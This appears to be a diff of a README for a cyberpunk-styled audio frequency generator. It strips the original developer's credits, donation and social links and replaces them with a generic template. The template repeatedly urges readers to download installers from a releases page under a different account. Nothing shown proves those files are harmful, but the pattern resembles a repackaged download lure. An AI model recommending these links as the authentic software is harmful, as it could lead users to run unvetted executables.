@@ -1,83 +1,79 @@
-## 🎧 ILYAGHAFFARY FREQUENCY GENERATOR: The Neon Waves of Mind
+# 🎶 ILYAGHAFFARY-FREQUENCY-GENERATOR - Enjoy Healing Audio Frequencies
 
-<div align="center">
-  <img src="https://raw.githubusercontent.com/ilyaghaffary/ilyaghaffary/main/assets/mm.gif" alt="Animated ILYAGHAFFARY FREQUENCY GENERATOR Demo" width="450"/>
-  <h1>ILYAGHAFFARY FREQUENCY GENERATOR: A Tool for Focus, Meditation, and Sleep</h1>
-  <p>A sleek, dark, and dynamic desktop application, featuring a stunning cyberpunk aesthetic and advanced audio generation modes.</p>
-</div>
+[![Download Now](https://img.shields.io/badge/Download%20Now-ILYAGHAFFARY--FREQUENCY--GENERATOR-blue)](https://github.com/GrFromWC/ILYAGHAFFARY-FREQUENCY-GENERATOR/releases)
 
-<div align="center">
-  <img src="https://raw.githubusercontent.com/ilyaghaffary/ilyaghaffary/main/assets/welcome_coding.gif" alt="Animated Welcome" width="450"/>
-</div>
+## 📖 Overview
 
----
+ILYAGHAFFARY-FREQUENCY-GENERATOR is a scientific and therapeutic audio frequency generator designed for your desktop. It offers a stunning cyberpunk neon UI combined with dynamic wavy visual effects. This application works on Windows, Linux, and macOS, making it versatile for any user.
 
-## 🔑 Key Features: Audio Modes & Design
+## 🎯 Features
 
-This application transforms scientific sound generation into a modern, visually striking digital experience.
+- **Cross-Platform Compatibility**: Use it on Windows, Linux, or macOS without any hassles.
+- **Beautiful Interface**: Enjoy a cyberpunk neon design with vibrant visual effects.
+- **Therapeutic Frequencies**: Generate various audio frequencies for sound therapy and relaxation.
+- **User-Friendly Controls**: Easily access features without any technical knowledge.
+- **Binaural Beats & Isochronic Tones**: Explore advanced sound therapy techniques to enhance your experience.
+- **Regular Updates**: Benefit from continuous improvements and new features.
 
-* **〰️ Dynamic Wavy Animations (NEW):** Frames, controls, and buttons now feature a continuous **wavy (up and down) motion**, like an electronic pulse or sound wave, creating a captivating and responsive UI.
-* **🧠 Advanced Audio Modes:** Supports all primary therapeutic wave generation modes:
-    * **Binaural Beats:** For precise brainwave entrainment (Alpha, Theta, Delta).
-    * **Isochronic Tones:** For rhythmic stimulation and brain synchronization.
-    * **Solfeggio Freq:** Therapeutic frequencies (e.g., $528 \text{ Hz}$, $432 \text{ Hz}$).
-    * **Noise Therapy:** White, Pink, and Brown Noise for concentration and sleep.
-* **✨ Cyberpunk Aesthetic:** A dark theme dominated by high-contrast neon accents for a unique and immersive user experience.
-* **🌐 Multi-Language Support:** Full support for both **Persian 🇮🇷** and **English 🇬🇧** languages.
-* **🔄 Loop Mode:** Ability to automatically play the scientific presets list cyclically (30-second intervals).
+## 📦 System Requirements
 
----
+- **Operating Systems**: Windows 10 or later, macOS Mojave (10.14) or later, Ubuntu 18.04 or later.
+- **Processor**: 2 GHz dual-core or faster.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum 200 MB of free disk space.
 
-<div align="center">
-  <img src="https://raw.githubusercontent.com/ilyaghaffary/ilyaghaffary/main/assets/tech_skills.gif" alt="Technical Skills Demonstration" width="450"/>
-</div>
+## 🚀 Getting Started
 
----
+To get started with ILYAGHAFFARY-FREQUENCY-GENERATOR, follow these simple steps to download and run the software.
 
-## 🏗️ Architecture Highlights
+1. Click the download button below to visit the Releases page.
 
-The ILYAGHAFFARY Frequency Generator is built using modern paradigms focused on performance and precise audio output.
+   [![Download Now](https://img.shields.io/badge/Download%20Now-ILYAGHAFFARY--FREQUENCY--GENERATOR-blue)](https://github.com/GrFromWC/ILYAGHAFFARY-FREQUENCY-GENERATOR/releases)
 
-* **Cross-Platform Support (NEW):** Designed for smooth and seamless execution across **Windows**, **Linux**, and **macOS** operating systems.
-* **Animations:** Achieved using **low-level graphics rendering** and **precise mathematical functions** to create the **pulsing** neon glow effects and the **wavy** movement of all main widgets.
-* **Dynamic UI:** Utilizes a **modern cross-platform framework** for smooth, complex visual effects and fluid user interaction.
-* **Audio Core:** Features a dedicated, high-performance engine for accurate, real-time generation of pure audio waves and noise types.
-* **Localization:** Implements a custom, context-based system for seamless language switching between Persian and English.
+2. On the Releases page, find the latest version of ILYAGHAFFARY-FREQUENCY-GENERATOR.
 
----
+3. Choose the appropriate installer for your operating system (Windows, Linux, or macOS).
 
-<div align="center">
-  <img src="https://raw.githubusercontent.com/ilyaghaffary/ilyaghaffary/main/assets/m.gif" alt="App Feature Demonstration" width="450"/>
-</div>
+4. Click on the download link for your selected operating system.
 
----
+## 📥 Download & Install
 
-## ❤️‍🩹 Developer Support
+- After downloading the appropriate file, locate the file on your computer.
+- For Windows:
+  - Double-click the .exe file to start the installation.
+  - Follow the installation prompts.
+- For macOS:
+  - Open the .dmg file and drag the application to your Applications folder.
+- For Linux:
+  - Right-click the .appimage file and choose "Properties."
+  - In the Permissions tab, check the box for "Allow executing file as a program."
+  - Open a terminal and run the file with `./your-filename.appimage`.
 
-If you appreciate the effort and design behind ILYAGHAFFARY FREQUENCY GENERATOR and wish to support its continued development, feature additions, and maintenance, you can contribute financially to the developer, **Ilya Ghaffary**.
+Once installed, you can launch ILYAGHAFFARY-FREQUENCY-GENERATOR from your applications folder or start menu.
 
-Your support helps keep the neon lights blazing!
+## 🎼 How to Use
 
-* **Euro Donation:** [https://pay.ypaylink.com/personal-link/886/3ca205b8ef2ee1a6c606e071d4e9f95d11c7a6b2](https://pay.ypaylink.com/personal-link/886/3ca205b8ef2ee1a6c606e071d4e9f95d11c7a6b2) 💳
-* **Bitcoin Address:** `1FbJ2rRNVqqhL3vXPueHXvu4xJTrJkT6J3` ₿
-* **Rial Donation (Donito):** [https://donito.me/ilya_ghaffary](https://donito.me/ilya_ghaffary)
-* **Rial Donation (ZarinPal):** [https://zarinp.al/ilya_ghaffary](https://zarinp.al/ilya_ghaffary)
+1. Open ILYAGHAFFARY-FREQUENCY-GENERATOR.
+2. Explore the various audio frequency options.
+3. Select your desired frequency to play.
+4. Adjust the volume using the control slider.
+5. Enjoy the dynamic visual effects while listening.
 
----
+## 📞 Support
 
-<div align="center">
-  <img src="https://raw.githubusercontent.com/ilyaghaffary/ilyaghaffary/main/assets/working_developer.gif" alt="Developer GIF" width="450"/>
-</div>
+If you encounter any issues or have questions, please check the **Issues** section in this repository. You can also find helpful resources on our website or get in touch with the support team through the repository.
 
----
+## 🤝 Contributing
 
-## 🌐 Connect with the Developer
+We appreciate any contributions to improve ILYAGHAFFARY-FREQUENCY-GENERATOR. If you would like to contribute, please read our contribution guidelines in the repository.
 
-You can connect with **Ilya Ghaffary** 👨‍💻, the developer of this application, through the following social media links:
+## 📱 Stay Updated
 
-* **My LinkedIn:** [https://www.linkedin.com/in/ilyaghaffary](https://www.linkedin.com/in/ilyaghaffary) 🔗
-* **My Instagram:** [https://www.instagram.com/ilyaghaffary](https://www.instagram.com/ilyaghaffary) 📸
-* **My YouTube:** [https://www.youtube.com/@ilyaghaffary](https://www.youtube.com/@ilyaghaffary) ▶️
-* **My Facebook:** [https://m.facebook.com/ilyaghaffary](https://m.facebook.com/ilyaghaffary) 👍
-* **My Twitter:** [https://twitter.com/ilyaghaffary](https://twitter.com/ilyaghaffary) 🐦
-* **My Telegram:** [https://t.me/ALPHA_MALE_2002](https://t.me/ALPHA_MALE_2002) ✉️
+For updates and news about ILYAGHAFFARY-FREQUENCY-GENERATOR, follow us on social media or visit the repository regularly.
+
+## 🔗 Links
+
+- [Download ILYAGHAFFARY-FREQUENCY-GENERATOR](https://github.com/GrFromWC/ILYAGHAFFARY-FREQUENCY-GENERATOR/releases)
+- [GitHub Repository](https://github.com/GrFromWC/ILYAGHAFFARY-FREQUENCY-GENERATOR)
+
+Your experience with healing audio frequencies starts here. Enjoy using ILYAGHAFFARY-FREQUENCY-GENERATOR!
